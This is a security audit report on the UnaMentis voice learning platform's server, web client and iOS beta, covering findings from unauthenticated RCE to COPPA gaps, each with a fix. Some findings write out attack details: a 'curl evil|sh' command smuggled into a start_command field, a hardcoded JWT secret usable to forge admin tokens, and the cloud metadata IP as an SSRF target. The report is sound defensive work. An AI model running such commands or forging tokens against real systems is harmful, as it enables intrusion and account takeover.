# UnaMentis Security & Open-Source Readiness Audit

**Date:** 2026-05-30
**Scope:** The `unamentis` parent repository (server, curriculum, docs, CI, scripts), with a focused readiness pass on the separate `unamentis-ios` beta repo.
**Lens:** Public open-source release, imminent iOS TestFlight beta, global scale, a learning platform that plausibly serves minors and markets itself as "Privacy-First."
**Method:** A 14-dimension multi-agent audit (94 agents) reading the actual git-tracked code, with every material finding adversarially verified against the source. 114 findings; 1 refuted on verification. This document is a report only. No code was changed.

---

## 1. What UnaMentis is, and why the bar is high

UnaMentis is a voice AI **learning platform** (not a "tutoring app", tutoring is one of 20+ capabilities). It runs 60 to 90+ minute voice sessions combining on-device and cloud STT/TTS/LLM, with a curriculum system (UMCF) that imports content from MIT OCW, CK-12, EngageNY, MERLOT and others, plus specialized modules (SAT, Knowledge Bowl). Its stated philosophy is "AI as learning partner, not substitute": teachback, productive struggle, spaced retrieval. It is explicitly intended to be a far-reaching, world-facing open-source project whose core "will always remain open source," and it is heading into beta.

Three facts set the severity bar for everything below:

1. **It is about to be public.** Anyone, including attackers, can read this source. Insecure defaults and hardcoded fallbacks become exploitation instructions the moment the repo is public.
2. **It serves learners, plausibly including children.** K-12 curriculum (CK-12, EngageNY, Knowledge Bowl school teams) means under-13 users are foreseeable, which pulls in COPPA, FERPA, GDPR-K, and SOPIPA obligations.
3. **It processes voice.** Audio, transcripts, and conversation content are among the most sensitive data categories, and some of it leaves the device for cloud providers.

The good news first: **the engineering instincts are strong.** The Management API auth stack, the schema's privacy modeling, the CI permissions hygiene, the secret hygiene, and the iOS client fundamentals are all genuinely above-average for an early-stage OSS project. The problem is not competence. It is that **a coherent "insecure by default / fail open" posture runs through the deployment and authorization layers**, and the public-facing privacy/governance documentation has drifted ahead of what the code actually does. Both are fixable, and most of the fixes are configuration and wiring, not rewrites.

---

## 2. Verdict

| Question | Answer |
|----------|--------|
| Is the tracked code free of leaked secrets? | **Yes.** Clean tree and clean ~400-commit history. A real strength. |
| Can the repo be made public *today* without security harm? | **No.** A public reader gains a working JWT-forgery secret and a map of unauthenticated mutating/RCE endpoints. Fix the criticals first. |
| Is the iOS client itself ready for a closed TestFlight beta? | **Largely yes** on security fundamentals (Keychain, ATS, hardened release logging). Close the privacy-manifest and LICENSE/SECURITY-pointer gaps. |
| Is the *server* ready to back a public beta serving (possibly minor) learners? | **Not yet.** Authorization, fail-open auth defaults, and the privacy-claims-vs-implementation gap are beta blockers. |

**Bottom line:** This is a high-quality codebase with a small number of systemic, high-severity issues concentrated in deployment defaults, authorization wiring, and the AWS Lambda auth tier. Address the "beta blockers" in Section 4 before going public or onboarding outside learners. The iOS app can proceed to a *closed* beta in parallel, but anything the app talks to (Management API, USM Core, log server) must be hardened first because beta testers run this stack on shared networks.

---

## 3. Findings at a glance

Severity is the **adjusted** severity after adversarial verification. Only 1 of 114 findings was refuted, which indicates the findings below are well-grounded.

| Severity | Count | Theme |
|----------|------:|-------|
| Critical | 7 | Unauthenticated RCE (USM Core), Management API public-namespace authz collapse, Lambda hardcoded JWT secret |
| High | 25 | Auth fail-open, SSRF, zip-slip, XSS, refresh-token-in-localStorage, COPPA gap, privacy-claims gap, rate-limiter launch bug |
| Medium | 29 | Cost-abuse endpoints, missing CSP, cache races, weak compose creds, mDNS LAN exposure, iOS privacy manifest |
| Low | 48 | XXE, error-string leakage, stale docs/badges, lockfile mismatches, plaintext UserDefaults fallback |
| Info/Refuted | 5 | (1 refuted: Dependabot github-actions claim) |

**The dominant theme** (echoed independently across the USM Core, Management API, log server, Bonjour, and Lambda dimensions): the system **binds `0.0.0.0`, defaults authentication off or to a known secret, and uses wildcard CORS**, while the docs actively encourage exposing it publicly via ngrok/cloudflared. This is one systemic posture, not five unrelated bugs, and it deserves one systemic response: a "fail closed" principle plus a self-hoster hardening guide.

---

## 4. Beta blockers (fix before the repo is public / before outside learners)

These are the issues a public reader can weaponize immediately, or that create legal exposure for a minor-serving platform.

### B1. USM Core is an unauthenticated remote code execution surface (CRITICAL)
`server/usm-core/crates/usm-core/src/server/mod.rs:71` binds the process-manager HTTP/WS API to `0.0.0.0` with `CorsLayer::permissive()` and **no authentication anywhere in the crate**. `POST /api/templates` accepts an arbitrary `start_command` string, which `build_start_command` interpolates into a shell line run via `/bin/zsh -c` (macOS) or `/bin/bash -c` (Linux) (`monitor/macos.rs:129-136`, `monitor/linux.rs:143-144`). The chain `POST /api/templates` (define `start_command: "curl evil|sh"`) then `POST /api/instances` then `POST /api/instances/:id/start` yields arbitrary code execution as the user, reachable by anyone on the same LAN or, via permissive CORS / DNS-rebinding, by any web page a victim visits. The README claims `localhost`; the code binds all interfaces. Beta testers run this on cafe/campus/dorm Wi-Fi.
**Fix:** Bind `127.0.0.1` by default (opt-in for anything else, gated behind auth+TLS). Add mandatory auth (bearer token from a `0600` file, or a Unix socket with peer-credential checks) on all mutating routes. Replace `CorsLayer::permissive()` with an explicit allowlist. Execute commands as an argv vector (`shell-words` + `Command::new(argv[0]).args(...)`), never a shell string; treat `start_command` as operator-only, never network input.

### B2. Management API marks every mutating namespace as PUBLIC (CRITICAL)
`server/management/auth/auth_middleware.py:36-59` defines `PUBLIC_PREFIXES` covering `/api/admin/`, `/api/tts`, `/api/deployments`, `/api/plugins`, `/api/import/`, `/api/services`, `/api/models`, `/api/kb`, `/api/modules`, `/api/curricula` with the comment "Management console routes are public as they run on internal/trusted networks." `is_public_route()` short-circuits auth for any path under these prefixes, so **every mutating endpoint is unauthenticated**, including:
- `POST /api/admin/users` with attacker-chosen `role` (no validation), and `DELETE /api/admin/users/{id}`: **unauthenticated admin-account creation and deletion of any user**, plus a full user-table dump via `GET /api/admin/users` (`server.py:4660-4799`).
- `DELETE /api/curricula/{id}`, `DELETE /api/logs`, `DELETE /api/models/{id}`, `POST /api/system/unload-models`, `POST /api/system/idle/force-state`: unauthenticated data loss, log-wiping (evidence destruction), and DoS (`server.py:5004-5210`).
- `PUT /api/tts/cache` (store arbitrary audio for any text/voice key) and `DELETE /api/tts/cache` (wipe): **cross-user TTS cache poisoning**, a learner (possibly a minor) could be served attacker-supplied audio in the platform's voice (`tts_api.py:1161-1163`).
- Plugin enable/disable/configure and deployment create/start (`plugin_api.py:744-758`, `deployment_api.py:651-655`), an SSRF/content-injection and cost lever.

The `require_auth`/`require_role`/`require_permission` decorators exist but are wired to **zero** routes. The auth framework is defeated by its own allowlist.
**Fix:** Invert to default-deny. Allowlist only genuinely public endpoints (`/health`, `/api/auth/login`, `/api/auth/register`, OAuth callbacks, read-only client telemetry intake). Apply `require_role('admin')`/`require_role('super_admin')` to admin/plugin/deployment/system/curriculum-mutation handlers. Validate `role` against an allowlist and forbid self-promotion.

### B3. Authentication and rate limiting are entirely opt-in, and fail open (CRITICAL/HIGH)
`server/management/server.py:5131-5161` only appends `auth_middleware` and `rate_limit_middleware` inside `if auth_secret:`. With `AUTH_SECRET_KEY` unset, the server runs with **no auth and no brute-force protection at all**, logging a single warning. Combined with the `0.0.0.0` default bind (`server.py:158`, read from `VOICELEARN_MGMT_HOST` while the README/`run.sh` advertise the non-matching `UNAMENTIS_MGMT_HOST`, so an operator following the docs fails to restrict the bind) and wildcard CORS (`server.py:4982`), the realistic default deployment is a fully open admin API.
**Fix:** Register `rate_limit_middleware` unconditionally. Treat missing `AUTH_SECRET_KEY` as fail-closed: refuse to start, or bind loopback only, when not configured and bound non-locally. Unify the env-var name across `server.py`, `run.sh`, and the README. Default the bind to `127.0.0.1`.

### B4. AWS Lambda auth tier ships a working forgery secret and a fail-open beta gate (CRITICAL/HIGH)
`server/lambda/services/shared/auth.py:50-56` returns the hardcoded constant `"insecure-dev-secret-do-not-use-in-prod"` when `JWT_SECRET` is unset, and `template.yaml:24-28` defaults `JwtSecret` to `""`, so a deploy that omits the parameter silently uses it. Because this string is in the public repo, anyone can forge a valid HS256 JWT, **including `is_admin: true`** (`create_jwt` accepts it, `get_current_user`/`require_admin` trust it), against any such deployment of the auth/curriculum/kb/metrics tier. Separately, `validate_beta_token` (lines 59-76) returns `True` for **any non-empty bearer string** when `BETA_TOKENS` is unconfigured (also empty by default). A placeholder login path (`auth/handler.py:193-228`) additionally mints real JWTs for any credentials when `ALLOW_PLACEHOLDER_AUTH=true`. The API Gateway uses `DefaultAuthorizer: NONE` (`template.yaml:67-68`), so there is no defense-in-depth backstop, and the KB handler is a no-auth placeholder stub.
**Fix:** Fail closed. Raise on missing `JWT_SECRET`/`BETA_TOKENS` outside an explicit `ENVIRONMENT=="dev"` guard. Remove the hardcoded secret entirely. Make `JwtSecret` a required, no-default NoEcho parameter sourced from Secrets Manager/SSM. Add a gateway authorizer so missing decorators fail closed. Remove the placeholder credential path. **Decide whether the Lambda tier or the (much stronger) Management API auth is the real beta backend, and retire the other.** Two divergent auth implementations is itself a risk.

### B5. Importer SSRF, zip-slip, and unbounded downloads (HIGH)
The content pipeline fetches and parses external curriculum with **no SSRF allowlist anywhere in the codebase**:
- `server/importers/enrichment/image_acquisition.py:154-215` does `session.get(url)` on unvalidated, externally-influenced image URLs (redirects followed, full body read into memory with no cap). Reachable via the unauthenticated import path. Can hit `169.254.169.254` (cloud IMDS credentials) or internal services.
- `server/importers/plugins/sources/merlot.py:731-805` fetches an attacker-influenceable `source_url` with `allow_redirects=True` and no allowlist; the robots.txt check is a no-op.
- `server/importers/plugins/sources/mit_ocw.py:1253-1255` extracts a scraped course ZIP with `zf.extractall(output_dir)`: classic **zip-slip** (arbitrary file write via `../`, potential overwrite of `authorized_keys`/server code) and no zip-bomb cap.
- CK-12/EngageNY/MIT buffer entire archives in memory with no size cap (`ck12_flexbook.py:847-922`, etc.): worker DoS, and the import worker runs in the live API process.
**Fix:** A shared URL validator (https-only, reject loopback/link-local/private/reserved ranges, re-validate after each redirect, cap bytes/stream to temp). Replace `extractall` with per-member realpath validation + symlink rejection + uncompressed-size caps. Parse XML with `defusedxml`. Run imports in a separate process. Require auth on the import/plugin endpoints.

### B6. Web client refresh-token-in-localStorage + KaTeX `trust:true` XSS (HIGH)
`server/web-client/src/lib/api/token-manager.ts:65-76` persists the **30-day refresh token** to `localStorage` (the short-lived access token is correctly memory-only, but the long-lived credential is the more valuable one). `server/web-client/src/components/visual/FormulaRenderer.tsx:45-51` renders attacker-influenced curriculum LaTeX with `katex.render(..., { trust: true, throwOnError: false })`, which enables `\href`/`\url`/`\htmlData` (javascript: URLs, attribute injection). A single stored/DOM XSS in a learner's session exfiltrates the refresh token, which is full account takeover. The intended httpOnly-cookie path is broken: the auth proxy drops the backend `Set-Cookie` (`api/auth/[...path]/route.ts`), so the app falls back to the insecure copy.
**Fix:** Set `trust:false` (or a strict allow-callback rejecting javascript:/data:). Store the refresh token in an HttpOnly/Secure/SameSite cookie set by the proxy (and fix the proxy to forward `Set-Cookie`/`Cookie`). Add a strict CSP to both Next apps.

### B7. Realtime audio WebSocket trusts a client-supplied `user_id` (HIGH)
`server/management/audio_ws.py:87-115` reads `session_id`/`user_id` from the query string with no token validation, then attaches to or creates that user's session. With `/ws` and `/api/sessions` public, anyone can **hijack another learner's voice session**, read its state, drive audio, and submit utterances. For a voice learning platform this is direct cross-user data exposure.
**Fix:** Authenticate the WS upgrade (validate JWT/refresh), bind the session to the authenticated user, and remove `/ws` and `/api/sessions` from the public allowlist for non-loopback deployments.

### B8. The mandated log server is an unauthenticated LAN PII oracle (HIGH, verified)
`scripts/log_server.py` (which CLAUDE.md says **MUST** be running for debugging) binds `0.0.0.0` by default (line 577, and line 19 instructs users to do so), with **no auth anywhere**. It serves `GET /logs` (returns the full in-memory buffer as JSON), `POST /clear` (wipe), and `POST /log` (ingest). On a voice learning platform, device logs routinely contain transcripts, user IDs, emails, and prompts. Any host on the same network can read all buffered learner data, forge logs, or wipe the buffer. This parallels the USM Core exposure and was the single biggest gap no audit dimension had owned.
**Fix:** Bind loopback by default. Require a shared-secret token on `/log`, `/logs`, `/clear`. Classify which fields carry PII and ensure clients do not send transcript content in plaintext over the LAN.

### B9. Children's-privacy controls exist in the schema but not in the code (HIGH)
`server/management/auth/auth_api.py:48-175` registers users with only email/password/display_name/device. It never captures `date_of_birth`/`is_minor`, never writes a `consent_records` row, and never gates PII collection for minors, **despite** a detailed schema (`privacy_tiers`, `consent_records`, `guardian_relationships`, `data_retention_policies`) and a `docs/PRIVACY_PRESERVING_USER_DATA.md` that promises a mandatory age gate and verifiable parental consent. Collecting a child's email, device fingerprint, and IP without verifiable parental consent is a direct COPPA concern (16 CFR 312) and contradicts the project's own spec.
**Fix (choose one before public beta):** (a) implement a real age gate + verifiable-parental-consent flow that writes `consent_records` and blocks under-13 PII collection until consent is verified, or (b) enforce a hard 13+/18+ age attestation and document that minors are out of scope for beta. Either way, do not ship the "full COPPA compliance" claim until the code matches.

### B10. Public privacy claims are not backed by implementation (HIGH)
README and `docs/PRIVACY_PRESERVING_USER_DATA.md` assert "Privacy-First," "All user data remains on-device," "Zero-Knowledge... the server NEVER sees raw user data," "voice recordings deleted immediately after transcription," and "full COPPA compliance." The server contradicts this: it persists email, bcrypt hash, device fingerprint, raw client IP (`INET`), and user agent; there is **no implemented data-export, deletion, or retention/anonymization job** (only refresh-token cleanup exists); registration requires agreeing to a Privacy Policy and Terms that **do not exist** (`/privacy` and `/terms` are dead links); and there is no sub-processor/DPA disclosure for which cloud STT/TTS/LLM providers receive voice/transcript data. For a public project where schools or parents may rely on these claims, this is legal and reputational exposure.
**Fix:** Reconcile claims with reality before beta. Mark the privacy spec as aspirational/iOS-design where it is not yet implemented. Implement export/deletion endpoints and a retention job (the schema's tables exist, just unenforced). Publish a real privacy policy, terms, and sub-processor list, and wire the consent flow. Soften README language to match shipped behavior, or implement the controls.

### B11. Token-bucket rate limiter rejects every client's first request (HIGH, launch bug)
`server/management/auth/rate_limiter.py:67-141` seeds new buckets with `tokens=0` and `last_update=now`, so the first request's elapsed-time refill is ~0 and the request is denied with HTTP 429. Reproduced empirically: a brand-new user's **first login** waits ~12s, and their **first registration** is locked out for ~20 minutes. This breaks onboarding on day one.
**Fix:** Seed new buckets full (`tokens=config.burst`) on first sight of a key.

---

## 5. Other notable findings (medium)

These are not all beta blockers but should be on the pre-1.0 list.

- **Denial-of-wallet (cross-cutting, verified pattern):** `/api/tts` is public and the TTS cache has no in-flight de-duplication, so an unauthenticated attacker can drive unbounded paid STT/TTS/LLM/embeddings spend with unique strings (each a cache miss to a paid provider), and the realtime-token endpoint mints billable OpenAI sessions with no auth or rate limit (`web-client/.../realtime/token/route.ts`). There is **no global spend cap, quota, or circuit breaker** anywhere. For self-hosters who paste their own keys, this is a real "denial-of-wallet" risk. **Add a hard daily-cost ceiling and per-IP quota independent of whether auth is enabled.**
- **Multi-tenant isolation is declared but unenforced (verified):** the `organizations` table and `tenant_id` JWT claim exist, but the only live use of `organization_id` is `WHERE email = $1 AND organization_id IS NULL` (`auth_api.py:109,227`). No data query filters by tenant, and registration never sets it. If multi-tenant tables are enterprise/aspirational, **document that isolation is not enforced** so self-hosters serving multiple schools do not assume it exists.
- **Web client fetches raw permanent provider keys into the browser:** the ElevenLabs/Deepgram client path is designed to retrieve the long-lived `xi_api_key`/Deepgram key client-side (`web-client/src/lib/providers/elevenlabs-tts.ts:63-97`), diverging from the correct ephemeral-token pattern already used for OpenAI. The `/api/providers/*/key` routes are not yet implemented, so this is a designed pattern that becomes a critical key leak the moment those routes ship. **Proxy provider audio server-side or mint scoped/ephemeral tokens.**
- **No Content-Security-Policy on either Next app**, and the learner-facing web-client sets no security headers at all (`web-client/next.config.ts`). CSP is the key defense-in-depth that would blunt the KaTeX XSS. **Add CSP + standard headers to both.**
- **LaTeX `pdflatex` shell-escape risk** (`importers/enrichment/formula_generator.py:259-290`): user LaTeX compiled without an explicit `-no-shell-escape`; if the deployed distro enables shell-escape (or `minted` is present), `write18` becomes RCE; even off, `\input`/`\openin` can read local files. **Pass `-no-shell-escape` explicitly, sandbox, validate the LaTeX subset, prefer the KaTeX path.**
- **TTS cache concurrency:** cache stampede with no in-flight dedup (`session_cache_integration.py:78-105`), an index-persistence race on a shared temp filename that can corrupt `index.json` (`tts_cache/cache.py:415-442`), and negative/garbage duration cached when a provider returns non-WAV (`resource_pool.py:214-226`). **Add a per-key in-flight `Future` registry, a save lock + unique temp names, and WAV validation.**
- **Internal exception strings returned to clients** across `server.py` (`str(e)` at multiple handlers): info disclosure on a public server. `safe_error_response()` exists but is under-used. **Apply it consistently; add a lint rule.**
- **Bonjour/mDNS advertises both management and gateway ports to the whole LAN** unauthenticated (`bonjour_advertiser.py:84-105`), turning passive presence into active discovery of the open attack surface. **Off by default; opt-in only after the advertised services require auth.**
- **Docker compose weak defaults:** DevLake (MySQL root `admin`, Grafana `admin/admin`, config-ui hardcoded `admin/admin`) and Unleash (hardcoded admin/client tokens, and `server.py:184` even defaults `FEATURE_FLAG_KEY` to the matching `proxy-client-key`), all with host-published ports. Dev-only is documented, but **bind ports to `127.0.0.1`, parameterize creds with no insecure fallback, pin image tags.**
- **GitHub Actions pinned to mutable tags** (`@v4`, `@stable`) instead of commit SHAs, including the credentialed `cloudflare/wrangler-action` and `codecov/codecov-action` jobs. The repo already SHA-pins one action, so the pattern is understood. **Pin all `uses:` to full SHAs; add `github-actions` to Dependabot.**
- **Lambda dependencies are floor-pinned (`>=`) with no lockfile** across all five services (the security-sensitive tier owning JWT/bcrypt/psycopg2). The Management API (uv.lock) and Operations Console (pnpm-lock) are exemplary by contrast. **Generate and commit hashed lockfiles per Lambda service; run pip-audit in CI.**
- **iOS privacy manifest** omits the Device ID data type despite `identifierForVendor` and device name being collected and uploaded (`PrivacyInfo.xcprivacy`); and metrics uploads send the device name (often the owner's real name) in cleartext HTTP headers over the LAN (`MetricsUploadService.swift:68-69`). **Declare Device ID; stop transmitting `UIDevice.current.name`, use the per-install UUID.**

---

## 6. Open-source governance & documentation

The governance skeleton is solid: valid MIT `LICENSE` (Copyright 2025 Richard Amerman, matching the badge), a `SECURITY.md` with a private reporting channel and concrete SLAs, a Contributor-Covenant `CODE_OF_CONDUCT.md`, a thorough `TRADEMARK.md`, `CODEOWNERS`, `FUNDING.yml`, and issue/PR templates. No `.DS_Store` is tracked. **Licensing is correctly centralized in this repo as the single source of truth**, per the documented multi-repo model, that is a strength, not duplication to "fix."

What undermines a credible public launch is **staleness from the pre-split iOS-monorepo era**:

- README CI badge points at a nonexistent `ci.yml` (always-broken badge on the landing page); actual workflows are `server.yml`, `web-client.yml`, etc.
- README Quick Start / Development invoke **gitignored** scripts (`test-quick.sh`, `test-all.sh`, `setup-local-env.sh`).
- Several README doc links 404 (`docs/ios/PRONUNCIATION_GUIDE.md`, `docs/ENTERPRISE_ARCHITECTURE.md`); README "Current Status" describes the iOS app, not the server repo.
- `CODEOWNERS` still gates `/UnaMentis/`, `*.xcodeproj`, `Package.swift` paths that no longer exist here; `CONTRIBUTING.md`, issue/PR templates, and even `SECURITY.md` scope themselves to "the iOS application."
- The committed **5.3MB `architecture.json`** is a stale machine-generated dump exposing the full internal structure of the now-separate iOS app (11k+ Swift references, an unannounced Apple Watch companion). It is pure bloat and information disclosure on the public server repo. **Remove it from the tracked tree (regenerate locally or publish a trimmed, current version).**

**iOS satellite-repo nuance (per your guidance):** the iOS repo intentionally relies on this repo for licensing/governance, so its lack of a duplicated LICENSE is *by design*, not "reinventing the wheel," and is **not** a blocker. The only advisory note: GitHub determines licensing per repository, so when `unamentis-ios` goes public it is conventional to include at least a short `LICENSE` (or a `LICENSE` that points to this repo's terms) plus a one-line SECURITY pointer, so someone who clones only that repo knows the terms. Low priority, easy win, fix the broken local LICENSE link in its README either way.

---

## 7. What the code does well (so the report is balanced)

- **Secret hygiene is excellent.** No real secrets in the tree or in ~400 commits of history. `.env.example` files are placeholders. The OpenAI realtime route correctly mints ephemeral tokens server-side. The local MCP credential flow (age-encrypted, `gh`-fetched, `chmod 600`, gitignored) is well-designed.
- **The Management API auth *primitives* are genuinely good:** bcrypt cost 12 with 128-char cap, RFC 9700 refresh-token rotation with token families and reuse detection, SHA-256-hashed refresh tokens, `secrets.compare_digest` constant-time comparison, JWT decode that validates aud/iss/exp. The framework is right; it is just not wired to the routes.
- **The schema is privacy-conscious by design:** privacy tiers, consent records with legal basis and guardian linkage, retention policies, structured audit log. A strong foundation to build real compliance on.
- **SQL injection is essentially absent:** asyncpg parameterized queries throughout, with field allowlists for dynamic UPDATE clauses. Thorough path-traversal defenses (`validate_path_in_directory`, `sanitize_path_segment`) with a dedicated test, and a 1MB body cap.
- **CI/CD is better than typical OSS:** every workflow sets least-privilege `permissions:`, no `pull_request_target`, no self-hosted runners, no script-injection of PR fields, `github-script` used safely.
- **Dependency hygiene is strong where it counts:** Management API `uv.lock` and Operations Console `pnpm-lock` ship current, non-vulnerable versions (aiohttp 3.13.3, PyJWT 2.10.1, bcrypt 5.0.0; Next 16.1.6 / React 19.2.3). No vendored trees or submodules in the public surface.
- **The Rust is idiomatic and well-tested** (anyhow/Result, proptest coverage, careful FFI null-checks); the security problem is the deployment model, not the code quality.
- **The iOS client fundamentals are right:** Keychain-managed keys, minimal ATS (only `NSAllowsLocalNetworking`, no arbitrary loads), and remote logging genuinely hardened off in release.

---

## 8. Cross-cutting themes (the "forest," not the trees)

1. **Insecure by default / fail open.** USM Core, Management API, log server, Bonjour, and Lambda independently bind `0.0.0.0`, default auth off or to a known secret, and use wildcard CORS. Fix with a single "fail closed" principle plus a **`SECURITY_DEPLOYMENT.md` hardening guide** that enumerates which binds to change to loopback, which secrets MUST be set, the CORS allowlist, and an explicit warning that USM Core + log server + Management API must never be exposed without auth. The docs currently encourage ngrok/cloudflared exposure, which makes this guide essential.
2. **Marketing ahead of implementation.** "Privacy-First," "full COPPA/FERPA/GDPR," "transparent data practices," and multi-tenant "organizations for schools" are asserted in docs/schema but unenforced (no age gate, no consent writes, no tenant filtering, no export/deletion, no license enforcement). The day-one-public credibility risk is broader than any single finding.
3. **Untrusted external content flows end-to-end unchecked.** External curriculum is fetched (SSRF), parsed (XXE/zip-slip), stored, cached cross-user, and **spoken aloud to learners** with no content moderation, no license enforcement, and no XSS sanitization at render. The whole "scrape to learner's ear" pipeline is the real surface, larger than the sum of the individual injection findings.
4. **Cost/resource exhaustion as a first-class risk.** Unauthenticated paid-provider invocation + unbounded downloads/decompression + cache stampedes + no spend caps = a denial-of-wallet + DoS theme owned by no single component.
5. **Aspirational scaffolding shipped publicly.** KB/curriculum/metrics Lambda handlers are stubs, the multi-tenant schema is unwired, consent/retention tables are unwritten. Self-hosters may deploy non-functional or insecurely-defaulted endpoints believing they work. **Clearly mark what is implemented vs planned.**

---

## 9. Areas not yet audited (recommended next passes)

This audit was deep on the 14 dimensions but could not own everything. Recommended follow-ups, roughly in priority order:

1. **`fov_context_api.py` session endpoints** (`analyze-response`, topic, messages): public namespace, accept arbitrary learner content, untrusted-input + authz not assessed.
2. **`tts_pregen` orchestration** (job_manager, orchestrator, content_extractors, repository): an input/cost/zip surface paralleling the main importer.
3. **GDPR erasure path & dual-database reality:** `handle_delete_admin_user` only deletes sessions+users (relies on cascade), there is no user-initiated export/delete, and it is unclear whether SQLite (curriculum DB) or Postgres (auth schema, where consent/guardian tables live) backs the beta, or whether PII lands in SQLite outside the cascade.
4. **Curriculum content licensing/redistribution:** does the pipeline enforce NC/ND/SA terms before caching third-party content cross-user and speaking it aloud? Is attribution surfaced at playback? Scraper politeness (robots.txt/ToS) is currently just a 0.5s sleep + semaphore.
5. **Accessibility (WCAG/Section 508/ADA):** material for a K-12 learning platform with a voice UI (live-transcript screen-reader support, captions, keyboard operability). Out of security scope but squarely "OSS readiness for worldwide adoption."
6. **`demo/ios_demo_video_generator.py`** subprocess automation (untrusted-input interpolation).
7. **Lambda `shared/db.py` `execute_many`/bulk-write transactionality** (only the Management tier's bulk writes were assessed).

---

## 10. Refuted / corrected findings (transparency)

One finding was refuted on verification, and several were adjusted. Of note: the claim "Dependabot does not monitor github-actions" had a true narrow fact (no `github-actions` block in `dependabot.yml`) but its stated thesis/severity were overstated, so it was downgraded to info. The iOS "no LICENSE" finding was downgraded from high to a low/advisory note per the documented single-source-of-truth model (Section 6). The low false-positive rate (1 of 114) reflects that every medium-and-above finding was re-read against the actual source by an independent skeptic agent.

---

## Appendix: suggested fix order

1. **Before making the repo public:** B1 (USM Core), B2 (public namespaces), B3 (fail-open auth), B4 (Lambda secret/beta-token), B8 (log server). These convert "public source" into "published exploit."
2. **Before onboarding any outside learner:** B5 (importer SSRF/zip-slip), B6 (web XSS/token), B7 (WS hijack), B9 (COPPA), B10 (privacy claims + policy), B11 (rate-limiter launch bug), plus the denial-of-wallet cap.
3. **Before 1.0 / wider beta:** the Section 5 medium list, the Section 6 doc staleness + `architecture.json` removal, the Section 9 follow-up audits, and a `SECURITY_DEPLOYMENT.md` hardening guide.
4. **In parallel (iOS closed beta can proceed):** privacy-manifest Device ID, stop sending device name in cleartext, fix the README LICENSE link, add a SECURITY pointer.
